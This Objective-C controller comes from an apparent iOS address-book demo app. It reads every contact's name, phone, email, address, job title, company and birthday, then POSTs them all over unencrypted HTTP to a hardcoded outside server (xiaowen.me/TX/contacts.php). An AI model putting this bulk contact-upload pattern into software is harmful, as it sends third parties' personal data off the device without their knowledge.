//
//  ABDContactController.m
//  ABDemo
//
//  Created by Zhenyi ZHANG on 2012-10-02.
//  Copyright (c) 2012 Zhenyi ZHANG. All rights reserved.
//

#import "ABDContactController.h"

@interface ABDContactController()

-(void)initDefaultContactList;

@end

@implementation ABDContactController

@synthesize contactList = _contactList;
@synthesize allPeople = _allPeople;
@synthesize nPeople = _nPeople;

- (void)setContactList:(NSMutableArray *)newList {
    if (_contactList != newList) {
        _contactList = [newList mutableCopy];
    }
}

-(void)setContactsAfterGranted:(ABAddressBookRef)addressBook {
    CFArrayRef allPeople = ABAddressBookCopyArrayOfAllPeople( addressBook );
    CFIndex nPeople = ABAddressBookGetPersonCount( addressBook );
    self.allPeople = allPeople;
    self.nPeople = nPeople;
}

//init all contacts in self.contactList
-(void)initDefaultContactList {
    
    NSMutableArray *contactList = [[NSMutableArray alloc] init];
    self.contactList = contactList;
    
    ABAddressBookRef addressBook = ABAddressBookCreateWithOptions(NULL, NULL);
    if (ABAddressBookGetAuthorizationStatus() != kABAuthorizationStatusAuthorized) {
        ABAddressBookRequestAccessWithCompletion(addressBook, ^(bool granted, CFErrorRef error) {
            [self setContactsAfterGranted:addressBook];
        });
    }else {
        [self setContactsAfterGranted:addressBook];
    }
}

//overwrite the constructor
- (id)init {
    if (self = [super init]) {
        [self initDefaultContactList];
        return self;
    }
    return nil;
}

- (NSUInteger)countOfList {
    return [self.contactList count];
}

- (NSString *)objectInListAtIndex:(NSUInteger)theIndex {
    return ([self.contactList objectAtIndex:theIndex]);
}

- (void)sendContactsWithCallback:(void (^)(void))callback inContext:(id)context
{
    
    CFArrayRef allPeople = self.allPeople;
    CFIndex nPeople = self.nPeople;
    ABRecordRef ref;
    
    NSMutableArray *encodedParam = [NSMutableArray array];
    
    NSString *firstName;
    NSString *lastName;
    NSString *phone;
    NSString *email;
    NSString *address;
    NSString *title;
    NSString *company;
    NSString *birthday;
    
    for ( int i = 0; i < nPeople; i++ )
    {
        ref = CFArrayGetValueAtIndex( allPeople, i );
        
        firstName = [self getFirstNameForPeople:ref];
        if (!firstName) firstName = @"";
        else firstName = [firstName stringByAppendingString:@" "];
        
        lastName = [self getLastNameForPeople:ref];
        if (!lastName) lastName = @"";
        else lastName = [lastName stringByAppendingString:@" "];
        
        phone = [self getPhoneNumberForPeople:ref];
        if(!phone) phone = @"";
        else phone = [[@"/ Phone: " stringByAppendingString:phone] stringByAppendingString:@" "];
        
        email = [self getEmailForPeople:ref];
        if(!email) email = @"";
        else email = [@"/ Email: " stringByAppendingString:email];
        
        NSString * param1 = [NSString stringWithFormat:@"Name%d=%@%@%@%@",i
                             ,[firstName stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]
                             ,[lastName stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]
                             ,[phone stringByAddingPercentEscapesUsingEncoding:NSASCIIStringEncoding]
                             ,[email stringByAddingPercentEscapesUsingEncoding:NSASCIIStringEncoding]];//NSASCIIStringEncoding
        
        address = [self getAddressForPeople:ref];
        if(!address) address = @"";
        else address = [[@"/ Address: " stringByAppendingString:address] stringByAppendingString:@" "];
        
        title = [self getTitleForPeople:ref];
        if(!title) title = @"";
        else title = [[@"/ Title: " stringByAppendingString:title]stringByAppendingString:@" "];
        
        company = [self getCompanyPhoneNumberForPeople:ref];
        if(!company) company = @"";
        else company = [[@"/ Organisation: " stringByAppendingString:company]stringByAppendingString:@" "];
        
        birthday = [self getBirthdayPhoneNumberForPeople:ref];
        if(!birthday) birthday = @"";
        else birthday = [@"/ Birthday: " stringByAppendingString:birthday];
        
        NSString *param2 = [NSString stringWithFormat:@"Detail%d=%@%@%@%@",i
                            ,[address stringByAddingPercentEscapesUsingEncoding:NSASCIIStringEncoding]
                            ,[title stringByAddingPercentEscapesUsingEncoding:NSASCIIStringEncoding]
                            ,[company stringByAddingPercentEscapesUsingEncoding:NSASCIIStringEncoding]
                            ,[birthday stringByAddingPercentEscapesUsingEncoding:NSASCIIStringEncoding]];
        param2 = [param2 stringByAppendingFormat:@"\n"];
        [encodedParam addObject:param1];
        [encodedParam addObject:param2];
//        NSLog(@"param1: %@",param1);
//        NSLog(@"param2: %@",param2);
//        [encodedParam removeAllObjects];
    }
    [self sendPost:encodedParam WithCallback:callback InContext:context];
}

- (void)sendPost:(NSArray *)encodedParam WithCallback:(void (^)(void))callback InContext:(id)context
{
    NSString * post = [encodedParam componentsJoinedByString:@"&"];
    NSData * postData = [post dataUsingEncoding:NSASCIIStringEncoding];
    
    NSURL * url = [NSURL URLWithString:@"http://www.xiaowen.me/TX/contacts.php"];
    NSMutableURLRequest * request = [[NSMutableURLRequest alloc] initWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setHTTPBody:postData];
    [request setValue:@"application/x-www-form-urlencoded" forHTTPHeaderField:@"Content-Type"];
    
    NSURLConnection *theConnection = [[NSURLConnection alloc] initWithRequest:request delegate:self];
    if (theConnection) {
        callback();
    }else {
        
    }
}

-(NSString *)getFirstNameForPeople:(ABRecordRef)thePeople{
    NSString *firstName = (__bridge NSString *)ABRecordCopyValue(thePeople, kABPersonFirstNameProperty);
    return firstName;
}

-(NSString *)getLastNameForPeople:(ABRecordRef)thePeople{
    NSString *lastName = (__bridge NSString *)ABRecordCopyValue(thePeople, kABPersonLastNameProperty);
    return lastName;
}

-(NSString *)getPhoneNumberForPeople:(ABRecordRef)thePeople{
    const ABMultiValueRef *phones = ABRecordCopyValue(thePeople, kABPersonPhoneProperty);
    CFStringRef phoneNumberRef = ABMultiValueCopyValueAtIndex(phones, 0);
    NSString *phonenumberStringValue = nil;
    if (phoneNumberRef) {
        phonenumberStringValue = (__bridge NSString *)phoneNumberRef;
        CFRelease(phoneNumberRef);
    }
    return phonenumberStringValue;
}

-(NSString *)getEmailForPeople:(ABRecordRef)thePeople{
    const ABMultiValueRef *emails = ABRecordCopyValue(thePeople, kABPersonEmailProperty);
    CFStringRef emailRef = ABMultiValueCopyValueAtIndex(emails, 0);
    NSString *emailStringValue = nil;
    if (emailRef) {
        emailStringValue = (__bridge NSString *)emailRef;
        CFRelease(emailRef);
    }
    return emailStringValue;
}

-(NSString *)getAddressForPeople:(ABRecordRef)thePeople{
    const ABMultiValueRef *addresses = ABRecordCopyValue(thePeople, kABPersonAddressProperty);
    NSDictionary *addressDic = (__bridge NSDictionary *)(ABMultiValueCopyValueAtIndex(addresses, 0));
    NSString *addressStringValue = nil;
    if(addressDic){
        NSString *street = [addressDic objectForKey:(NSString *)kABPersonAddressStreetKey];
        if (!street) street = @"";
        else street = [street stringByAppendingString:@","];
        NSString *city = [addressDic objectForKey:(NSString *)kABPersonAddressCityKey];
        if (!city) city = @"";
        else city = [city stringByAppendingString:@","];
        NSString *zip = [addressDic objectForKey:(NSString *)kABPersonAddressZIPKey];
        if (!zip) zip = @"";
        else zip = [zip stringByAppendingString:@","];
        NSString *country = [addressDic objectForKey:(NSString *)kABPersonAddressCountryKey];
        if (!country) country = @"";
        addressStringValue = [NSString stringWithFormat:@"%@ %@ %@ %@",
                              street,zip,city,country];
    }
    return addressStringValue;
}

-(NSString *)getTitleForPeople:(ABRecordRef)thePeople{
    NSString *titleStringValue = (__bridge NSString*)ABRecordCopyValue(thePeople, kABPersonJobTitleProperty);
    return titleStringValue;
}

-(NSString *)getCompanyPhoneNumberForPeople:(ABRecordRef)thePeople{
    NSString *companyStringValue = (__bridge NSString *)ABRecordCopyValue(thePeople, kABPersonOrganizationProperty);
    return companyStringValue;
}

-(NSString *)getBirthdayPhoneNumberForPeople:(ABRecordRef)thePeople{
    static NSDateFormatter *formatter = nil;
    if (formatter == nil) {
        formatter = [[NSDateFormatter alloc] init];
        [formatter setDateStyle:NSDateFormatterMediumStyle];
    }
    
    CFDateRef birthdays = ABRecordCopyValue(thePeople, kABPersonBirthdayProperty);
    NSString *birthdayStringValue = nil;
    if(birthdays){
        NSDate *date=(__bridge NSDate *)birthdays;
        birthdayStringValue = [formatter stringFromDate:date];
    }
    return birthdayStringValue;
}

// get multi values from data sources
- (NSArray *)getAllEmailsForPeople:(ABRecordRef)thePeople
{
    NSMutableArray *collector = [[NSMutableArray alloc] initWithCapacity:0];
    const ABMultiValueRef *emails = ABRecordCopyValue(thePeople, kABPersonEmailProperty);
    CFStringRef emailRef;
    NSString *emailStringValue;
    for (int i = 0; i < ABMultiValueGetCount(emails); i++) {
        emailRef = ABMultiValueCopyValueAtIndex(emails, i);
        if (emailRef) {
            emailStringValue = (__bridge NSString *)emailRef;
            [collector addObject:emailStringValue];
            CFRelease(emailRef);
        }
    }
    return collector;
}

- (NSArray *)getAllPhoneNumbersForPeople:(ABRecordRef)thePeople
{
    NSMutableArray *collector = [[NSMutableArray alloc] initWithCapacity:0];
    const ABMultiValueRef *phones = ABRecordCopyValue(thePeople, kABPersonPhoneProperty);
    NSString *phonenumberStringValue = nil;
    CFStringRef phoneNumberRef;
    
    for (int i = 0; i < ABMultiValueGetCount(phones); i++) {
        phoneNumberRef = ABMultiValueCopyValueAtIndex(phones, i);
        if (phoneNumberRef) {
            phonenumberStringValue = (__bridge NSString *)phoneNumberRef;
            [collector addObject:phonenumberStringValue];
            CFRelease(phoneNumberRef);
        }
    }
    return collector;
}

- (NSArray *)getAllAddressForPeople:(ABRecordRef)thePeople
{
    NSMutableArray *collector = [[NSMutableArray alloc] initWithCapacity:0];
    const ABMultiValueRef *addresses = ABRecordCopyValue(thePeople, kABPersonAddressProperty);
    NSDictionary *addressDic;
    NSString *addressStringValue = nil;
    NSString *street;
    NSString *city;
    NSString *zip;
    NSString *country;
    
    for (int i = 0; i < ABMultiValueGetCount(addresses); i++) {
        addressDic = (__bridge NSDictionary *)(ABMultiValueCopyValueAtIndex(addresses, i));
        if(addressDic){
            street = [addressDic objectForKey:(NSString *)kABPersonAddressStreetKey];
            if (!street) street = @"";
            else street = [street stringByAppendingString:@","];
            city = [addressDic objectForKey:(NSString *)kABPersonAddressCityKey];
            if (!city) city = @"";
            else city = [city stringByAppendingString:@","];
            zip = [addressDic objectForKey:(NSString *)kABPersonAddressZIPKey];
            if (!zip) zip = @"";
            else zip = [zip stringByAppendingString:@","];
            country = [addressDic objectForKey:(NSString *)kABPersonAddressCountryKey];
            if (!country) country = @"";
            addressStringValue = [NSString stringWithFormat:@"%@ %@ %@ %@",
                                  street,zip,city,country];
            [collector addObject:addressStringValue];
        }
    }
    
    return collector;
}


@end
